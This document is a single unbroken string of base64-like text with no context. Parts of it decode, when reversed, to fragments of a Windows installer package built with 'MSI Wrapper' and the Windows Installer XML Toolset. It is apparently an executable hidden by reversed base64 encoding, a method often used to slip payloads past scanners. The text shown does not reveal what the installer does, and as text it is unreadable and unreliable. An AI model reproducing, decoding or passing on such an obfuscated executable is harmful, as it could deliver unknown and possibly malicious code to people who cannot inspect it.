AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAA0BAAAAAAAAAAAAWAQEAfAwHAIDArBAAAsIAAAwEAMBAEBARAMBAfAwHA4HAfAAAAAAACCQJAQEAAAQJAMBAAAQJAMBArAwEAsGApBAAAUGATAwEAAAAAAwEAMBAAAAAA8BATAwEAAAAYBwHAAAAEBQQAMBAAAwSAMBATAwEAAAATAgMAMBAlAwKAMBAAAQJAMBAAAQJAMBAAAQJAMBAAAAAAAAATAAAAAAAAAAAA8BAfAwEAMBAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAgBAAAAAAgBAYAAAAAAAAAAGAAAAAAAGAAAAAAAAAAAAAAAAAAAAYAAAAgBAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQYAAAAAAAAA8CAAAAAA8CANBAAAAAAAAQTAAAAAAQNAAAAAAAAAAAAAAAAAAAA1AAAAsDAAAQNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8////PAAAAAACAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8////PgA83/AAAAAAAAAAAAAAAAACwf/DAAAAAAAAAAACwf/DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8////PAAAAAAAAAAAAAAAAgA83//////DAAAAAAAAAAACwf/DIA/9PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw/////AAAAAAAAAAAAAAAAACwf/DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwf/DAAAAAAAAAAACwf/DAAAAAAAAAAACwf/DAAAAAAAAAAAAAAAAAAAAw/////AAAAAAAAAAw/////ACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAwf////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAIAAEAAAAAAAAAAAAAAAAwf//P/AAAAAAAAAAwf//P/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAIAAAAgAAQAAAAAAAAAAAAgAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAgAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwf//P/AAAAAAAAAAwf//P/AAAAAAAAAAwf//P/AAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAEAgAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAGAgBAYAACAgBAIAACAgAAIAACAgBAYAACAgAAYAAGAgBAIAACAgBAIAACAgBAYAACAgBAYAACAgAAIAAGAgBAIAACAgAAIAAGAgAAIAACAgAAYAAGAgBAIAACAgBAYAAGAgBAYAACAgAAIAAGAgAAYAACAgAAYAACAgBAIAACAgBAYAACAgBAYAACAgBAYAACAgAAIAAGAgBAIAAGAgBAYAAGAgBAIAACAsJAZCQlAMJARCwaAcDAKCAiAYIAfBwBAEAACCwBAAIA+BAfAoHA4BAQAUCALAwJAUCAjAwJAUCAjAQLAEAArBQaAcGAkBQYA8FA3AwJA8FAdBgVAQFARBwTA0EA3AANAsAAGBwQAAEAjAABAsEAJBQNAoDA3AANAEDAvAQJA0CABAwJAUCAjAwJAUCAjAwJAUCAjAQCAcAASAQEAABAPAgDA0AAMAwCAUAACAAkAAJAQCAkAAJAQCAkAYIAGCghAYIAGCghAIIACCwdAcHA3BwdAcHA3BAdAQHAzBwcAMHAyBgcAIHAvBwbAEGAhBQYAEGAhBQYAEGAhBAXAwFANBQTA0EANBQTA0EANBQTA0DA9AQPA0DA9AQNAUDA1AwLA8CAvAwLA8CAvAwKAsCAqAgKAoCApAQKAkCAiAgIAICAKAgCAYAAGAgBAYAAGAgBAYAAGAgBAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAADAAApAjL4ITMx4COuMDKgQXZzx2bvRFIM1EWgIXZsxWY0NnbJByc39GZul2VAAAArAAAA4BAAAgAAAAADAAAAgMAAAwAB8MOBBAMuAjLw4SMgQGZBJXZzVFAAAAEAAAAeAAZkFkclNXVAAAAIAAAA4BAwVlcld3bQBAAAgAAAAgHA02bj5Saz1WZ4VmL3d3dg02byZGIpAjL0UjLx4CNoAiclBHchJ3Vgk0UNBSeiBCZlBHchJ3dgIXZsxWY0NnbJBAAAAEAAAgHAAQKw4CN14SMuQDKgIXZwBXYydFIJNVTAAAAXAAAA4BAAAgAAAAADAAAAIAAAAwAAAAAIDAAAMQAPjTQ1RfLAAAAAAUAPjTQ1RfLAAAAAAEAA03Q0IkQ4AjQFBjNyIULDJ0QB1SQ0MENtEDM3cTLGFzMFlDNwE0eAAAAnAAAA4BAAMzMwEzOsVGdulEAAAwCAAAAeAAAAIXZsxWY0NnbJBAAAoAAAAgHAAABkDAAAIAAAEAAAAAATAAABgAAAAgEAAAA4DAAA8AAAAA8AAAAOAAAAQOAAAQDAAAAYDAAAwAAAAAqAAAAJAAAAQJAAAwBAAQAoAAAAYAAAAAgAAAAFAAABAHAAAABAAQAACAAAMAAAEAkAAAACAAAAgHAAAQAAAAAOAAABgKAAAAMZP7JrAACRuKEo9U+y/ZhgDAAAEAAAAAAAAAAAAAAAAAAAAAAAIQAGAAA/7//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+DAAAw1///v/////+////7PAAAAW////+////7PAAAQVAAAAUBAAAMFAAAgUAAAARBAAAAFAAAwTAAAAOBAAA0EAAAAT////+DAAAoEAAAQSAAAAIBAAAcEAAAgRAAAAFBAAAQEAAAwQAAAACBAAAEEAAAAQAAAA/AAAA4z///v/AAAA9AAAAsz///v/////+////7////v/AAAA2AAAAUDAAAgO////+////7////v/////+////7PAAAwM////+////7////v/////+DAAAkCAAAAKAAAAnAAAAYCAAAQJAAAAkAAAAMCAAAgIAAAAhAAAAACAAAwHAAAAeAAAA0BAAAAHAAAAbAAAAoBAAAQGAAAAYAAAAcBAAAgFAAAAVAAAAQBAAAwEAAAASAAAAEBAAAAEAAAAPAAAA4AAAAQDAAAAMAAAAsAAAAgC/////////7PAAAwBAAAAGAAAAUAAAAABAAAADAAAAIAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw///////////////PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8///////////////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw///////////////PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiB////+DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8///////////////HAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASoEUsChTRo8DKFhfQoakzFlfQKjEQAAAAAAAAAgBAAAwKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////DAAA0AAAAgEBIAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASoEUsChTRo8jE/E7QwEkyIBEAAAAAAAAAwAAAAoCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw/////AAAABAAAAQQACAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACZCRoZENCxhQ3YkJCtzOxOEMBpMSABAAAAAAAgAEAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8////PAAAwAAAAAVEgAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgUMExaRkHE7DR+P/jEQAAAAAAAABgNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////DAAAkBAAAAEBIAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4GAvBQaAQHAhBQbAIHAvBgZA4GAJBQeAIHAhBQbA0GA1BwUAUAAAAAAAAwFABAAAMQAPL26TaJSQBAAAAAAAAAAAAAAAYEAAAAAAAAwAAAAAAADQQIAAAgA//////////PAFAgFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5BgcAQHAuBQRAACA0BwbA8GAS9//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+DAAAEz///v/AAAAwAAAA4CAAAQL////+DAAAsCAAAgKAAAApAAAAgCAAAwJAAAAmAAAAUCAAAAJAAAAjAAAAICAAAQIAAAAgAAAA8BAAAgHAAAAdAAAAwBAAAwGAAAAaAAAAkBAAAgFAAAAYAAAAwCAAAQFAAAAUAAAAMBAAAgEAAAARAAAAABAAAwDAAAAOAAAA0AAAAADAAAALAAAAoAAAAQCAAAAI8///7PAAAgBAAAAFAAAA8y///v/////+////3PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA